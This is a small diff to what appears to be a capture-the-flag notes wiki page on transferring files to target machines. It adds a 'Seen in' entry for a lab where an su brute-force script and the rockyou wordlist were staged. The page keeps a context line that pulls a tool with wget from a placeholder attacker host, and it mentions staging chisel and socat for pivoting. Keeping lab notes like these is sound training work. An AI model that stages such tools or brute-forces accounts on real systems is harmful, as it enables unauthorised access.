@@ -22,4 +22,4 @@ wget http://HOST:8000/tool -O tool    # rename on save
 
 ## Seen in
 
-[[borazuwara]] (downloaded the JPEG for metadata), [[grooti]] (instructions + image), [[littlepivoting]] (`Linux-Su-Force.sh` + `rockyou.txt` from the attacker; manual re-run staged `chisel`/`socat`), [[cap]] (downloaded pcap `0`), [[rutas]] (pulled `crackpass.jpg` off the author's GitHub Pages site for [[steganography]])
+[[borazuwara]] (downloaded the JPEG for metadata), [[grooti]] (instructions + image), [[littlepivoting]] (`Linux-Su-Force.sh` + `rockyou.txt` from the attacker; manual re-run staged `chisel`/`socat`), [[file]] (same staging pair — `Linux-Su-Force.sh` + `rockyou.txt` for [[su-brute-force]]), [[cap]] (downloaded pcap `0`), [[rutas]] (pulled `crackpass.jpg` off the author's GitHub Pages site for [[steganography]])
